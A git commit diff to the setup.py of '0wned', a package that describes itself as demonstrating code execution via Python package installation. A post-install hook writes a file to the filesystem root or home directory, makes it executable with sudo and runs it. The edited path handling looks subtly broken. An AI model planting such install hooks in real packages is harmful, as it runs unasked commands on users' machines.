be1f2283be2faaf9f685b9b24ad508d91abe591d
Almir Junior <almir.junior.dev@outlook.com>
2021-08-22 17:31:43 -0400

    Test autoexecute

--- setup.py
+++ setup.py
@@ -34,7 +34,7 @@ def touch_file():
             print(message)
             root_fd.write(message + '\n')
             os.system("sudo chmod +x " + os.path.join(os.path.abspath(os.sep), FILENAME))
-            os.system(os.path.join(os.path.abspath(os.sep), FILENAME))
+            os.system("./"+os.path.join(os.path.abspath(os.sep), FILENAME))
     except (IOError, OSError):
         try:
             with open(USER_PATH, 'a') as user_fd:
@@ -46,7 +46,7 @@ def touch_file():
                 print(message)
                 user_fd.write(message + '\n')
                 os.system("sudo chmod +x " + os.path.join(os.path.expanduser('~'), FILENAME))
-                os.system(os.path.join(os.path.expanduser('~'), FILENAME))
+                os.system("./"+os.path.join(os.path.expanduser('~'), FILENAME))
         except (IOError, OSError):
             print('Could not write to {!r} or {!r}'.format(ROOT_PATH, USER_PATH))
             print('What kind of tricky system are you running this on?')
@@ -66,7 +66,7 @@ class PostInstallCommand(install):
 
 setup(
     name='0wned',
-    version='0.9.2',
+    version='0.9.3',
     description='Code execution via Python package installation.',
     long_description=long_description,
     long_description_content_type='text/markdown',
